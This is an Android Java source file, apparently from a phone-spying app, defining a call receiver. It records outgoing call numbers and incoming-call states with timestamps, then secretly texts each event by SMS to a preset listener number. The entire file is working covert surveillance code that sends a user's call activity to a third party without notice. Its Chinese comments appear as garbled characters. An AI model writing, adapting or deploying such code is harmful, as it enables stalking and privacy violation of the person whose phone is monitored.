package com.receiver;

import java.util.Calendar;
import java.util.List;

import value.getValueUtil;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class CallReceiver extends BroadcastReceiver{
	public static  String tomyphone;
	public Calendar c = Calendar.getInstance();  
    public int year = c.get(Calendar.YEAR);
    public int month = c.get(Calendar.MONTH)+1;
    public int day = c.get(Calendar.DAY_OF_MONTH); 
    public int hour = c.get(Calendar.HOUR_OF_DAY);  
    public int minute = c.get(Calendar.MINUTE);
    public int second = c.get(Calendar.SECOND);
    public String TheTime=year+"-"+month+"-"+day+" "+hour+":"+minute+":"+second+"  ";
    public static String phonenum="";
	@Override
	public void onReceive(Context context, Intent intent) {
		getValueUtil gvu = new getValueUtil();
		tomyphone = gvu.getmyValueforListenerNumber(context);
		if(gvu.getmyValueforListenerYesOrNo(context).equals("yes")){
			if(gvu.getmyValueforCallYesOrNo(context).equals("yes")){
				if(intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)){
					//��ȡ�������ĺ���
					phonenum = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
					MySendSMS(TheTime+":outgoing call "+phonenum,context,intent);
				}else{
					TelephonyManager tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);  
					switch (tm.getCallState()) {  
					case TelephonyManager.CALL_STATE_RINGING:  
						phonenum = intent.getStringExtra("incoming_number");  
						MySendSMS(TheTime+":ringing "+phonenum,context,intent);
						break;  
					case TelephonyManager.CALL_STATE_OFFHOOK:  
						MySendSMS(TheTime+":offhook "+phonenum,context,intent);
						break;  
					case TelephonyManager.CALL_STATE_IDLE:  
						MySendSMS(TheTime+":idle "+phonenum,context,intent);
						break;  
					} 
				}
			}else{
				System.out.println("�绰����ֹͣ");
			}
		}else{
			System.out.println("����ֹͣ");
		}
	}
	
	public  void MySendSMS(String message,Context context, Intent intent){
        PendingIntent pi = PendingIntent.getActivity(context, 0, intent, 0);
        SmsManager smsManager = SmsManager.getDefault();  
        List<String> divideContents = smsManager.divideMessage(message);    
        for (String text : divideContents) {    
        	smsManager.sendTextMessage(tomyphone, null, text, pi, null);
        }
    }

}
